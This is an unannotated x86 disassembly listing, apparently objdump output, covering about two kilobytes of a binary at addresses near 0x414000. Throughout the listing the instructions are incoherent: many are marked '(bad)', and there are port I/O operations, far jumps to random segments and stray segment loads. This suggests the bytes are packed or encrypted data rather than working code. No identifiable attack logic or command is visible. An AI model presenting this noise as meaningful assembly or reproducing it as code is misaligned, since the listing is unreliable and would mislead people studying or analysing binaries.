  4140c4:	shl    ch,cl
  4140c6:	lods   al,BYTE PTR ds:[esi]
  4140c7:	(bad)  
  4140c9:	xchg   di,ax
  4140cb:	pop    ds
  4140cc:	arpl   WORD PTR [edi-0x46],dx
  4140cf:	mov    ds:0x87ddb65a,al
  4140d4:	clc    
  4140d5:	mov    bl,0x62
  4140d7:	test   DWORD PTR [edi+0x41],ecx
  4140da:	(bad)  
  4140dc:	inc    ebp
  4140dd:	stos   BYTE PTR es:[edi],al
  4140de:	xchg   esp,eax
  4140df:	rcl    esi,cl
  4140e1:	cmp    dl,BYTE PTR [eax]
  4140e3:	xlat   BYTE PTR ds:[ebx]
  4140e4:	and    BYTE PTR [edi-0x3baa3d58],bl
  4140ea:	clc    
  4140eb:	rol    BYTE PTR [esi+0x4b76ee7b],0xce
  4140f2:	data16 sahf 
  4140f4:	out    0x3,al
  4140f6:	xor    BYTE PTR [edi],0x82
  4140f9:	lods   al,BYTE PTR ds:[esi]
  4140fa:	cmp    eax,0xe6f88752
  4140ff:	call   0x3bcf:0x2e9e422a
  414106:	cmp    eax,0x6fa0403d
  41410b:	xchg   esp,eax
  41410c:	ds jg  0x414098
  41410f:	pop    eax
  414110:	mov    edx,0x77c4b325
  414115:	pop    eax
  414116:	cdq    
  414117:	cmp    DWORD PTR [ebp-0x3d],edi
  41411a:	mov    bh,0x59
  41411c:	fistp  WORD PTR [edx+0x18]
  41411f:	in     al,dx
  414120:	aaa    
  414121:	pop    edx
  414122:	jge    0x414170
  414124:	les    ebx,FWORD PTR [eax-0x2334879c]
  41412a:	fcmovb st,st(1)
  41412c:	mov    esp,0xd8a7cc08
  414131:	mov    eax,0x5576d0e4
  414136:	mov    esp,0xef5c4ae3
  41413b:	es xchg ebp,eax
  41413d:	inc    edx
  41413e:	cmp    ecx,DWORD PTR [eax]
  414140:	jmp    0x3f09:0xb3cf3a64
  414147:	js     0x414130
  414149:	dec    edx
  41414a:	cld    
  41414b:	mov    cl,0xb4
  41414d:	je     0x41419d
  41414f:	iret   
  414150:	(bad)  
  414151:	loope  0x414132
  414153:	xor    al,BYTE PTR [esi]
  414155:	sbb    al,0x0
  414157:	outs   dx,BYTE PTR ds:[esi]
  414158:	in     al,0xad
  41415a:	inc    ebp
  41415b:	into   
  41415c:	das    
  41415d:	cld    
  41415e:	fadd   st,st(4)
  414160:	xchg   esi,eax
  414161:	sbb    DWORD PTR [edi-0x27bb2eca],esp
  414167:	stos   DWORD PTR es:[edi],eax
  414168:	sbb    al,0x96
  41416a:	fidivr DWORD PTR [edx+ebp*2-0xb9e4101]
  414171:	and    eax,0xe04e121b
  414176:	(bad)  
  414177:	cmp    DWORD PTR [ebp+0x52],ebx
  41417a:	sahf   
  41417b:	and    DWORD PTR [esi-0x65],ebx
  41417e:	pop    ds
  41417f:	popf   
  414180:	pusha  
  414181:	enter  0x76bf,0x16
  414185:	out    0x9f,al
  414187:	mov    cl,0x53
  414189:	or     al,0xfa
  41418b:	rcl    bl,cl
  41418d:	sbb    BYTE PTR [edi+eax*2],dl
  414190:	mov    dh,0x5f
  414192:	rol    DWORD PTR [ebp-0x50],1
  414195:	imul   edx,ecx,0x58
  414198:	mov    eax,ds:0xd8e24f6f
  41419d:	push   ecx
  41419e:	pop    ss
  41419f:	sub    dl,al
  4141a1:	aam    0x6d
  4141a3:	inc    edi
  4141a4:	cmp    ch,BYTE PTR [esi-0x3f57117f]
  4141aa:	scas   al,BYTE PTR es:[edi]
  4141ab:	cmp    DWORD PTR [esi+esi*2+0x3a],0x22
  4141b0:	jae    0x4141b2
  4141b2:	push   0xffffff83
  4141b4:	idiv   BYTE PTR [esi-0x4d]
  4141b7:	push   ebx
  4141b8:	mov    DWORD PTR [ebx],eax
  4141ba:	es jns 0x4141fa
  4141bd:	dec    eax
  4141be:	in     eax,dx
  4141bf:	adc    eax,0xb78d17f2
  4141c4:	daa    
  4141c5:	ins    BYTE PTR es:[edi],dx
  4141c6:	adc    ebx,DWORD PTR [edi+0x51]
  4141c9:	mov    ds:0x1d6fe0c,eax
  4141ce:	(bad)  
  4141cf:	sub    ebx,ebp
  4141d1:	jge    0x414184
  4141d3:	leave  
  4141d4:	and    dh,dh
  4141d6:	add    eax,0x517c2
  4141db:	fcom   st(5)
  4141dd:	clc    
  4141de:	arpl   WORD PTR [edi-0x4ffb1a12],bp
  4141e4:	in     al,0xf2
  4141e6:	rcl    ax,cl
  4141e9:	cmovns edi,DWORD PTR ds:0x89479172
  4141f0:	not    DWORD PTR [ebp-0xbb5ef20]
  4141f6:	jns    0x414219
  4141f8:	cmp    BYTE PTR [esi+0x2],bl
  4141fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141fc:	dec    ebx
  4141fd:	mov    eax,ds:0xa191aa7
  414202:	inc    esp
  414203:	out    0x3c,al
  414205:	ins    BYTE PTR es:[edi],dx
  414206:	push   edi
  414207:	pop    eax
  414208:	cmp    eax,0x18e3ed38
  41420d:	add    ah,al
  41420f:	sub    al,0xd
  414211:	popa   
  414212:	mov    eax,edi
  414214:	test   al,0xae
  414216:	loop   0x4141b0
  414218:	pop    edi
  414219:	jl     0x4141cc
  41421b:	ja     0x4141f2
  41421d:	mov    WORD PTR [esi+edi*8],fs
  414220:	jns    0x4141a9
  414222:	push   ecx
  414223:	pop    esi
  414224:	repz dec ebp
  414226:	(bad)  
  414227:	mov    dl,0xb3
  414229:	mov    cl,0x70
  41422b:	test   DWORD PTR [edi-0x21],0x1d379b9e
  414232:	pusha  
  414233:	xchg   edi,eax
  414234:	jmp    0x4014:0xd42f44f2
  41423b:	sar    BYTE PTR [ecx],0x59
  41423e:	jmp    0x13bb:0x7bdd5ac7
  414245:	or     DWORD PTR [ebx-0x486521f8],esi
  41424b:	sti    
  41424c:	(bad)  
  41424d:	jns    0x4141fc
  41424f:	ss fcmovu st,st(5)
  414252:	out    0x83,eax
  414254:	jbe    0x41426c
  414256:	adc    BYTE PTR [ecx+ebp*4+0x31],dl
  41425a:	sbb    eax,0x82031333
  41425f:	loopne 0x414252
  414261:	aas    
  414262:	ja     0x4141fc
  414264:	pop    ds
  414265:	add    al,0x6d
  414267:	or     DWORD PTR [edx],0x725ae6cf
  41426d:	sub    al,0xff
  41426f:	inc    ecx
  414270:	sub    BYTE PTR [eax],bl
  414272:	jg     0x41422e
  414274:	test   BYTE PTR [esi-0x7e],bl
  414277:	jg     0x4142ae
  414279:	push   ebx
  41427a:	cmp    cl,dl
  41427c:	inc    edx
  41427d:	pop    esp
  41427e:	adc    BYTE PTR [ebp-0x37],dl
  414281:	sti    
  414282:	scas   al,BYTE PTR es:[edi]
  414283:	gs push 0xece64ea7
  414289:	ss cwde 
  41428b:	adc    dh,BYTE PTR [edi]
  41428d:	dec    ebx
  41428e:	(bad)  
  41428f:	mov    esp,0x71b2da18
  414294:	pushf  
  414295:	sbb    bl,BYTE PTR [edx]
  414297:	jne    0x41426e
  414299:	mov    esi,0xa8b42803
  41429e:	or     BYTE PTR [ebp+0x79816e02],dh
  4142a4:	xor    BYTE PTR [eax+esi*4+0x684a9648],dl
  4142ab:	rcr    BYTE PTR [ecx],cl
  4142ad:	inc    esi
  4142ae:	mov    esi,0xfddefd19
  4142b3:	and    DWORD PTR [esi+0x70bf3f5c],eax
  4142b9:	xor    eax,0x91a97139
  4142be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142bf:	cdq    
  4142c0:	jmp    0xc5dd2517
  4142c5:	ins    BYTE PTR es:[edi],dx
  4142c6:	mov    ecx,0xb569d09a
  4142cb:	stos   DWORD PTR es:[edi],eax
  4142cc:	xchg   ebp,eax
  4142cd:	add    BYTE PTR [eax],bl
  4142cf:	xor    BYTE PTR [ebx+0x3d],bh
  4142d2:	or     eax,0xaa0b3307
  4142d7:	jecxz  0x4142cb
  4142d9:	add    eax,0x681b40b1
  4142de:	mov    ds:0xe11fcb32,eax
  4142e3:	jbe    0x41427c
  4142e5:	int    0x38
  4142e7:	and    ch,BYTE PTR [ebx+edx*1-0x419f9d0f]
  4142ee:	aad    0xa6
  4142f0:	fcmovu st,st(0)
  4142f2:	pop    ebx
  4142f3:	push   eax
  4142f4:	push   ebp
  4142f5:	lea    edi,[edi+0x1e]
  4142f8:	mov    cl,0x54
  4142fa:	jmp    0x6fcb3c32
  4142ff:	jno    0x414366
  414301:	retf   
  414302:	push   ecx
  414303:	idiv   DWORD PTR [edx-0x627ae087]
  414309:	in     eax,0xc7
  41430b:	sbb    eax,0x47071f56
  414310:	push   esi
  414311:	mov    ebp,0x7743cdc
  414316:	jbe    0x4142ad
  414318:	stos   BYTE PTR es:[edi],al
  414319:	loop   0x4142c7
  41431b:	enter  0x3d24,0x1b
  41431f:	xchg   ch,al
  414321:	call   0x153c:0x869b7e5c
  414328:	add    al,0x10
  41432a:	es dec ebp
  41432c:	cmp    al,0xc0
  41432e:	imul   esp,DWORD PTR [ebx],0x3305d173
  414334:	ret    0xf7b1
  414337:	inc    edx
  414338:	or     eax,0x82b19c07
  41433d:	mov    eax,ds:0x71b0437
  414342:	in     al,dx
  414343:	je     0x4143ae
  414345:	(bad)  
  414346:	icebp  
  414347:	inc    esp
  414348:	lods   al,BYTE PTR ds:[esi]
  414349:	aaa    
  41434a:	jnp    0x414349
  41434c:	inc    ecx
  41434d:	cmp    edx,DWORD PTR [ebx+0x1928c792]
  414353:	and    eax,0x7158ec9b
  414358:	mov    cl,0x2d
  41435a:	mov    BYTE PTR [esi+0x53ed1dfc],dl
  414360:	ret    
  414361:	mov    esp,0xfde569fe
  414366:	push   esp
  414367:	mov    dl,0x73
  414369:	imul   eax,DWORD PTR [eax+0x27],0x23d2223c
  414370:	sbb    eax,0xbe350165
  414375:	mov    eax,ds:0xc2bcb276
  41437a:	inc    edi
  41437b:	pop    ebp
  41437c:	fiadd  DWORD PTR [edx+eiz*2+0x5619500f]
  414383:	(bad)  
  414384:	push   eax
  414385:	shl    BYTE PTR [edx+0x70faeaa0],cl
  41438b:	push   edx
  41438c:	jmp    0x414358
  41438e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41438f:	pop    ss
  414390:	inc    ebp
  414391:	loopne 0x414359
  414393:	xlat   BYTE PTR ds:[ebx]
  414394:	mov    ebp,0xc7764533
  414399:	mov    BYTE PTR [ecx-0x45],al
  41439c:	sub    eax,0x4c71e68
  4143a1:	mov    ch,BYTE PTR [ebx]
  4143a3:	jne    0x41439e
  4143a5:	cmp    dl,BYTE PTR [edx+eax*8]
  4143a8:	and    bl,BYTE PTR [ebp-0x4]
  4143ab:	fs add ch,ch
  4143ae:	icebp  
  4143af:	mov    BYTE PTR [esi-0xd],ah
  4143b2:	stc    
  4143b3:	sub    DWORD PTR [edi],edx
  4143b5:	pop    ss
  4143b6:	mov    DWORD PTR [ebx],ebp
  4143b8:	(bad)  
  4143b9:	add    eax,0x35bb8270
  4143be:	jge    0x414352
  4143c0:	and    DWORD PTR [edi-0x3e6b0c88],ebp
  4143c6:	adc    esi,edx
  4143c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143c9:	add    eax,0xeff74298
  4143ce:	loope  0x414448
  4143d0:	pop    edx
  4143d1:	xor    esp,DWORD PTR [ebx+eax*1-0x5c]
  4143d5:	sub    ebp,ebx
  4143d7:	lahf   
  4143d8:	sub    eax,0xa9bf2eed
  4143dd:	enter  0x66e5,0x4e
  4143e1:	test   bh,al
  4143e3:	or     ch,BYTE PTR [ecx+0x1d]
  4143e6:	in     eax,dx
  4143e7:	push   esp
  4143e8:	(bad)  
  4143e9:	mov    ebx,0x2df4223
  4143ee:	sub    cl,BYTE PTR [esi-0x53511023]
  4143f4:	mov    ecx,DWORD PTR [edi-0x4b1d0ea]
  4143fa:	shr    BYTE PTR [ebx+0x5e0e0744],1
  414400:	sub    ah,BYTE PTR [ebx]
  414402:	scas   al,BYTE PTR es:[edi]
  414403:	jge    0x414391
  414405:	and    DWORD PTR ds:0x6f670d74,esp
  41440b:	int3   
  41440c:	pop    edx
  41440d:	add    al,BYTE PTR [esi]
  41440f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414410:	in     al,0x3c
  414412:	(bad)  
  414413:	fucomp st(1)
  414415:	loop   0x41439c
  414417:	or     ch,al
  414419:	push   eax
  41441a:	mov    bh,0x94
  41441c:	out    dx,al
  41441d:	lods   al,BYTE PTR ds:[esi]
  41441e:	or     al,0x6c
  414420:	push   edx
  414421:	mov    es,eax
  414423:	stos   DWORD PTR es:[edi],eax
  414424:	scas   eax,DWORD PTR es:[edi]
  414425:	fdivr  DWORD PTR [esi]
  414427:	imul   ebp,edx,0x45
  41442a:	in     eax,dx
  41442b:	inc    esp
  41442c:	iret   
  41442d:	push   cs
  41442e:	gs loope 0x414495
  414431:	(bad)  
  414433:	ins    BYTE PTR es:[edi],dx
  414434:	enter  0xe7f5,0x6f
  414438:	adc    al,0x89
  41443a:	cli    
  41443b:	clc    
  41443c:	adc    BYTE PTR [ebx],ch
  41443e:	xlat   BYTE PTR ds:[ebx]
  41443f:	into   
  414440:	jno    0x414474
  414442:	push   0x63ad6b8f
  414447:	inc    ecx
  414448:	setp   BYTE PTR [eax+ebp*4+0x62]
  41444d:	mov    esp,0x55048212
  414452:	dec    ebx
  414453:	in     al,dx
  414454:	cmp    dh,bh
  414456:	ficomp DWORD PTR [eax+esi*4-0x43fd83fe]
  41445d:	push   es
  41445e:	pop    eax
  41445f:	clc    
  414460:	push   0x75f5db60
  414465:	loope  0x414490
  414467:	rol    BYTE PTR [esi-0x13],0xe6
  41446b:	and    edx,DWORD PTR [ebp+eax*4-0x2cf3c5bf]
  414472:	stos   BYTE PTR es:[edi],al
  414473:	inc    esp
  414474:	and    eax,0xde5c81c6
  414479:	hlt    
  41447a:	jne    0x4144a1
  41447c:	cdq    
  41447d:	fiadd  DWORD PTR [eax+edi*2-0x69]
  414481:	aaa    
  414482:	(bad)  
  414483:	push   esp
  414484:	jbe    0x4144fc
  414486:	mov    ecx,0x2ad386c9
  41448b:	aas    
  41448c:	dec    BYTE PTR [ecx-0x70]
  41448f:	jo     0x41441f
  414491:	push   0xffffffbc
  414493:	jecxz  0x414451
  414495:	repnz sub DWORD PTR [edx-0x496a003a],0xc0984895
  4144a0:	lock and al,0x96
  4144a3:	imul   edi,esi,0xab787efd
  4144a9:	or     al,BYTE PTR [edx]
  4144ab:	mov    dh,0x3
  4144ad:	(bad)  
  4144ae:	push   ebp
  4144af:	push   ds
  4144b0:	push   ds
  4144b1:	add    BYTE PTR [esi-0xe5594eb],bh
  4144b7:	je     0x41451e
  4144b9:	inc    esp
  4144ba:	xor    al,0x7a
  4144bc:	cmp    eax,0x9445e019
  4144c1:	push   0xff68e86f
  4144c6:	stos   DWORD PTR es:[edi],eax
  4144c7:	sbb    BYTE PTR [edx+0x37],dl
  4144ca:	mov    BYTE PTR [ecx-0x5e],dh
  4144cd:	cmp    DWORD PTR [eax+edx*2+0x16],esp
  4144d1:	idiv   DWORD PTR [ecx]
  4144d3:	mov    ds:0xa8830af0,al
  4144d8:	adc    BYTE PTR [edx-0x66aeb25f],bl
  4144de:	xchg   ebp,eax
  4144df:	push   es
  4144e0:	fidivr WORD PTR [edx+0x777cfd7d]
  4144e6:	icebp  
  4144e7:	in     al,0x35
  4144e9:	test   al,0x53
  4144eb:	sbb    al,0x87
  4144ed:	mov    al,ds:0xade6c8b4
  4144f2:	fidivr WORD PTR [edi+0x48]
  4144f5:	mov    edi,0x9aac989c
  4144fa:	imul   esi,DWORD PTR fs:[edx],0x7a
  4144fe:	cmp    ebx,edx
  414500:	mov    DWORD PTR [ebp-0x43],ecx
  414503:	hlt    
  414504:	hlt    
  414505:	mov    ch,0x75
  414508:	into   
  414509:	adc    al,0x8f
  41450b:	sub    ch,BYTE PTR [edx+0x362d2589]
  414511:	retf   
  414512:	push   ebx
  414513:	add    edx,esi
  414515:	xlat   BYTE PTR cs:[ebx]
  414517:	jns    0x4144a0
  414519:	pushf  
  41451a:	inc    ebx
  41451b:	fild   DWORD PTR [ebx+0x6d]
  41451e:	pop    ecx
  41451f:	sar    BYTE PTR fs:[eax-0x8],cl
  414523:	cmp    al,0x44
  414525:	push   ds
  414526:	outs   dx,BYTE PTR ds:[esi]
  414527:	(bad)
  41452c:	pop    ss
  41452d:	loope  0x4144c7
  41452f:	stc    
  414530:	mov    ch,0xea
  414532:	pcmpgtb mm2,QWORD PTR [eax-0x35afd1cb]
  414539:	test   BYTE PTR [eax+0x6d12efcb],cl
  41453f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414540:	les    ecx,FWORD PTR [si+0x7ad]
  414545:	push   cs
  414546:	dec    eax
  414547:	ja     0x414504
  414549:	fimul  WORD PTR [ecx-0x6]
  41454c:	(bad)  
  41454d:	stos   BYTE PTR es:[edi],al
  41454e:	mov    bl,0x8a
  414550:	div    DWORD PTR [ebx+0x5946dc4e]
  414556:	out    0xc8,eax
  414558:	jb     0x414579
  41455a:	aaa    
  41455b:	inc    edx
  41455c:	dec    eax
  41455d:	hlt    
  41455e:	or     BYTE PTR [edi+0x28d1297f],0x73
  414565:	mov    cl,0x51
  414567:	jmp    0x6a4:0xed5cdffe
  41456e:	jbe    0x4144f6
  414570:	les    eax,FWORD PTR [ecx+0x6a8ea4f0]
  414576:	pop    ebp
  414577:	int3   
  414578:	je     0x414511
  41457a:	in     al,dx
  41457b:	clc    
  41457c:	popf   
  41457d:	das    
  41457e:	fucom  st(6)
  414580:	xchg   esi,eax
  414581:	jbe    0x414590
  414583:	and    DWORD PTR gs:0x64d81978,0x5bf75b2a
  41458e:	ret    
  41458f:	cwde   
  414590:	lea    ecx,[edx+0x27029ff9]
  414596:	push   ebx
  414597:	mov    al,bh
  414599:	inc    eax
  41459a:	pop    ds
  41459b:	clc    
  41459c:	mov    DWORD PTR [ecx-0x2efe7984],edx
  4145a2:	loop   0x414527
  4145a4:	test   eax,0xadddfc6c
  4145a9:	xchg   ebx,eax
  4145aa:	adc    ah,BYTE PTR [edi]
  4145ac:	or     ebx,ebp
  4145ae:	dec    eax
  4145af:	dec    ebp
  4145b0:	lahf   
  4145b1:	cmp    ecx,DWORD PTR [esp+eax*2+0x5f512ace]
  4145b8:	or     eax,0x80c47110
  4145bd:	shl    BYTE PTR [edi-0x42],0x69
  4145c1:	popf   
  4145c2:	cmp    BYTE PTR [edi+0x18],cl
  4145c5:	dec    eax
  4145c6:	fmul   DWORD PTR [ebp+edx*4+0x17cfecbd]
  4145cd:	repz out dx,al
  4145cf:	mov    eax,0x8628a111
  4145d4:	(bad)  
  4145d5:	jb     0x414630
  4145d7:	or     BYTE PTR [edx],dh
  4145d9:	jmp    DWORD PTR [edi+0x94d9149]
  4145df:	sar    DWORD PTR [eax+0x2c144eb8],cl
  4145e5:	sbb    DWORD PTR ds:0x32dab990,esi
  4145eb:	inc    edi
  4145ec:	idiv   edi
  4145ee:	push   es
  4145ef:	cmp    al,0x72
  4145f1:	jmp    0xc9e3:0x1332c6c5
  4145f8:	mov    ds:0x34dd48,al
  4145fd:	and    al,0xe7
  4145ff:	in     eax,dx
  414600:	rcr    ch,1
  414602:	mov    edx,0xecb7d2e2
  414607:	pop    ebx
  414608:	ficomp WORD PTR [ebp-0x6c]
  41460b:	outs   dx,BYTE PTR ds:[esi]
  41460c:	gs cmpxchg dh,bh
  414610:	fiadd  DWORD PTR [esi-0x62]
  414613:	push   cs
  414614:	dec    eax
  414615:	push   edx
  414616:	in     al,0xe5
  414618:	(bad)  
  414619:	aad    0xe4
  41461b:	in     eax,0x20
  41461d:	xor    esp,DWORD PTR [ecx]
  41461f:	neg    DWORD PTR [edx+0x14]
  414622:	mov    BYTE PTR [ebx-0x1167997f],al
  414628:	adc    eax,ebx
  41462a:	out    dx,eax
  41462b:	stc    
  41462c:	mov    cl,0x18
  41462e:	push   ecx
  41462f:	add    al,0xae
  414631:	mov    al,0x1a
  414633:	shl    BYTE PTR [eax+esi*8-0x30],cl
  414637:	pop    eax
  414638:	inc    edx
  414639:	pop    ecx
  41463a:	or     eax,0xaa0a6bf2
  41463f:	cmp    esp,DWORD PTR cs:[ebp+edx*8+0x5]
  414644:	jmp    0xf39b:0xc93e
  41464a:	mul    DWORD PTR gs:0x628a86ca
  414651:	cld    
  414652:	and    eax,0xbe25c4d6
  414657:	jl     0x4145eb
  414659:	aad    0x79
  41465b:	pop    esp
  41465c:	sub    eax,0xad2773f4
  414661:	mov    dh,0x11
  414663:	sbb    esp,ebx
  414665:	pop    ebx
  414666:	push   0xffffffc2
  414668:	js     0x4145ef
  41466a:	sub    al,0xa8
  41466c:	or     esp,ebp
  41466e:	sbb    eax,0x13c2d0f
  414673:	xchg   ebx,eax
  414674:	ins    BYTE PTR es:[edi],dx
  414675:	mov    WORD PTR [edx-0x3536fa81],gs
  41467b:	and    esp,eax
  41467d:	pop    ss
  41467e:	out    0xb,al
  414680:	or     al,BYTE PTR [eax-0x1d48e904]
  414686:	popa   
  414687:	adc    DWORD PTR [edx-0x2bfb6a0c],edx
  41468d:	in     al,0x8a
  41468f:	push   es
  414690:	sub    al,0x13
  414692:	sub    al,0x84
  414694:	pop    eax
  414695:	jmp    0x2796:0x17de2410
  41469c:	sbb    al,0x66
  41469e:	mov    ebx,0xe5a40aa7
  4146a3:	stos   BYTE PTR es:[edi],al
  4146a4:	push   cs
  4146a5:	jae    0x41467e
  4146a7:	sar    DWORD PTR [esi-0x4e9c7897],cl
  4146ad:	inc    edx
  4146ae:	mov    cl,0x11
  4146b0:	inc    ebx
  4146b1:	xor    bl,BYTE PTR [edi]
  4146b3:	push   edi
  4146b4:	inc    eax
  4146b5:	push   0x44788002
  4146ba:	push   0x2eb7959f
  4146bf:	cmp    BYTE PTR [ecx],0xc7
  4146c2:	pop    es
  4146c3:	les    ebx,FWORD PTR [esi+0x7]
  4146c6:	sbb    esp,ebx
  4146c8:	gs add edi,edx
  4146cb:	and    BYTE PTR [eax+0xd],0xe4
  4146cf:	pop    esi
  4146d0:	push   0xffffffc7
  4146d2:	test   DWORD PTR [edx],0xd2afccf7
  4146d8:	outs   dx,DWORD PTR ds:[esi]
  4146d9:	lods   eax,DWORD PTR ds:[esi]
  4146da:	mov    DWORD PTR [ebp-0x19],edi
  4146dd:	sub    DWORD PTR [ecx-0x7],ecx
  4146e0:	shl    BYTE PTR [eax],1
  4146e2:	test   eax,0x6a670a31
  4146e7:	xor    BYTE PTR [ebp+0x366fad8f],dl
  4146ed:	mov    esi,DWORD PTR [edx]
  4146ef:	xor    al,0x92
  4146f1:	and    DWORD PTR [ebx],0x7c51f4b2
  4146f7:	sbb    al,0xdc
  4146f9:	push   ecx
  4146fa:	out    dx,eax
  4146fb:	mov    edi,0x286446b6
  414700:	and    eax,0xff555017
  414705:	pop    eax
  414706:	sahf   
  414707:	xchg   ecx,eax
  414708:	jbe    0x4146ee
  41470a:	jns    0x414770
  41470c:	cmp    eax,DWORD PTR ds:0x593eb9e8
  414712:	call   0x367ce50c
  414717:	out    dx,eax
  414718:	outs   dx,BYTE PTR ds:[esi]
  414719:	popf   
  41471a:	push   es
  41471b:	jno    0x414735
  41471d:	imul   ebx,DWORD PTR [edx],0xe361783b
  414723:	idiv   DWORD PTR [edx-0x17367065]
  414729:	fadd   QWORD PTR [esi]
  41472b:	push   0x51
  41472d:	xchg   DWORD PTR [esi-0xb258432],ebx
  414733:	mov    al,ds:0x4f4b778f
  414738:	xchg   ebp,eax
  414739:	pop    esp
  41473a:	pop    edi
  41473b:	pop    edi
  41473c:	test   BYTE PTR [ebx+esi*4-0x54],al
  414740:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414741:	into   
  414742:	inc    eax
  414743:	inc    edi
  414744:	js     0x41472d
  414746:	push   es
  414747:	stos   BYTE PTR es:[edi],al
  414748:	mov    ch,0x4d
  41474a:	aas    
  41474b:	popf   
  41474c:	dec    ecx
  41474d:	daa    
  41474e:	xchg   BYTE PTR [ebx],bh
  414750:	dec    ecx
  414751:	and    bh,BYTE PTR [edx]
  414753:	ins    BYTE PTR es:[edi],dx
  414754:	(bad)  
  414755:	ds xchg ecx,eax
  414757:	push   0x79
  414759:	aas    
  41475a:	bound  ebp,QWORD PTR [esi]
  41475c:	or     cl,BYTE PTR [ebx+0x3f4322aa]
  414762:	push   ebp
  414763:	test   al,0x60
  414765:	punpckhdq mm7,QWORD PTR [ecx+0x0]
  414769:	inc    edi
  41476a:	gs enter 0x5307,0x8d
  41476f:	jl     0x4147cb
  414771:	enter  0x6468,0xe4
  414775:	scas   eax,DWORD PTR es:[edi]
  414776:	loopne 0x414767
  414778:	and    BYTE PTR [edi-0x591c445f],bl
  41477e:	sub    al,0xc7
  414780:	jge    0x4147ad
  414782:	mov    dh,0x8c
  414784:	jae    0x4147af
  414786:	repnz out dx,al
  414788:	test   DWORD PTR [esi-0x53],esp
  41478b:	pop    ecx
  41478c:	lds    edx,FWORD PTR [esi-0x6eeaad76]
  414792:	cmp    eax,0x117a70bb
  414797:	sar    DWORD PTR [ebx+0x68],1
  41479a:	add    bh,BYTE PTR [ebp-0x6031245f]
  4147a0:	mov    eax,0xc3dcb2c
  4147a5:	ja     0x414823
  4147a7:	mov    eax,0xadf32867
  4147ac:	sbb    eax,0x1cb01bc3
  4147b1:	add    al,0xc4
  4147b3:	and    ecx,ebp
  4147b5:	es mov dh,0x37
  4147b8:	imul   ebp,DWORD PTR [eax],0x6
  4147bb:	sti    
  4147bc:	push   0xd8650183
  4147c1:	je     0x414774
  4147c3:	xchg   ebx,eax
  4147c4:	mov    ebx,0x42a9948c
  4147c9:	jl     0x4147ed
  4147cb:	sub    eax,DWORD PTR [esp+edi*4-0x7b69102b]
  4147d2:	xor    edi,edx
  4147d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147d5:	(bad)  
  4147d7:	push   0xf6dec104
  4147dc:	mov    ebp,0x6dfefe16
  4147e1:	in     al,dx
  4147e2:	lea    edi,[edx]
  4147e4:	jae    0x4147ea
  4147e6:	inc    edx
  4147e7:	mov    BYTE PTR [eax-0x712f677b],cl
  4147ed:	stos   DWORD PTR es:[edi],eax
  4147ee:	jmp    0x414854
  4147f0:	jno    0x414814
  4147f2:	cmc    
  4147f3:	inc    ecx
  4147f4:	out    0x1,al
  4147f6:	call   0x61d77896
  4147fb:	push   ebx
  4147fc:	daa    
  4147fd:	mov    esi,0xc6cb987
  414802:	ins    DWORD PTR es:[edi],dx
  414803:	out    0x56,al
  414805:	or     ebx,DWORD PTR [esi+0xd9d3a20]
  41480b:	loopne 0x414814
  41480d:	jnp    0x4147fd
  41480f:	push   0xfffffff5
  414811:	xor    ah,BYTE PTR [esi]
  414813:	(bad)  
  414814:	jno    0x414881
  414816:	lahf   
  414817:	lahf   
  414818:	mov    ebx,ss
  41481a:	dec    esi
  41481b:	sub    edi,0xf944b5e
  414821:	pop    ds
  414822:	pop    esi
  414823:	sub    cl,BYTE PTR ds:0x72037e23
  414829:	fs aad 0x6d
  41482c:	xchg   BYTE PTR [edx-0x39],bh
  41482f:	mov    cs,WORD PTR [eax+0xc]
  414832:	xchg   ebx,eax
  414833:	mov    dh,0x21
  414835:	xor    eax,0xb35a1d37
  41483a:	xchg   edx,eax
  41483b:	add    BYTE PTR [eax-0x6d],bl
  41483e:	jecxz  0x4147da
  414840:	stc    
  414841:	push   eax
  414842:	pop    edx
  414843:	aas    
  414844:	xor    al,0x48
  414846:	ffreep st(0)
  414848:	adc    eax,0x32b7bd51
  41484d:	xchg   ebp,eax
  41484e:	inc    esi
  41484f:	addr16 pop ss
  414851:	ret    0x18ba
  414854:	inc    eax
  414855:	inc    ebx
  414856:	out    0x24,al
  414858:	stos   BYTE PTR es:[edi],al
  414859:	sub    BYTE PTR [edi],0x89
  41485c:	rcl    ecx,0x3e
  41485f:	adc    eax,0x61f9f33c
  414864:	mov    ebp,0xc74fa1a7
  414869:	mov    eax,ds:0x4e24190b
  41486e:	add    DWORD PTR [ecx-0x4a],ecx
  414871:	(bad)  
  414872:	mov    esp,0xadcf2407
  414877:	mov    bl,0xaa
  414879:	clc    
  41487a:	(bad)  
  41487b:	(bad)  
  41487d:	push   ds
  41487e:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  414880:	xchg   ebx,eax
  414881:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  414883:	sahf   
  414884:	lea    eax,[eax-0x80]
  414887:	loop   0x414819
  414889:	not    DWORD PTR ds:0xe472ce00
  41488f:	sbb    ebp,DWORD PTR [ecx]
  414891:	pop    ebp
  414892:	(bad)  
  414893:	mov    ?,edx
  414895:	jmp    0x414842
  414897:	int3   
  414898:	retf   
  414899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41489a:	in     eax,dx
  41489b:	xchg   BYTE PTR [ebp-0x55f7ebf4],ah
  4148a1:	stos   DWORD PTR es:[edi],eax
  4148a2:	xchg   BYTE PTR [edi+0x40],dh
  4148a5:	call   0x1018:0xa2e133c6
  4148ac:	pop    esp
  4148ad:	jmp    0x4148d7
  4148af:	inc    eax
  4148b0:	jb     0x41484e
  4148b2:	cmc    
  4148b3:	pop    esi
  4148b4:	pop    esp
  4148b5:	push   ss
  4148b6:	(bad)  
  4148b7:	mov    edx,0xe88acdaf
  4148bc:	and    eax,0x870c6393
  4148c1:	mov    ebp,0x5b368fbf
  4148c6:	dec    esp
  4148c7:	iret   
  4148c8:	cli    
  4148c9:	mov    ebx,0xbf6670b7
  4148ce:	inc    ecx
  4148cf:	rol    DWORD PTR [edx-0x50],cl
  4148d2:	jno    0x414925
  4148d4:	ficom  DWORD PTR [esi]
  4148d6:	and    DWORD PTR [ecx+0x31034aef],ebx
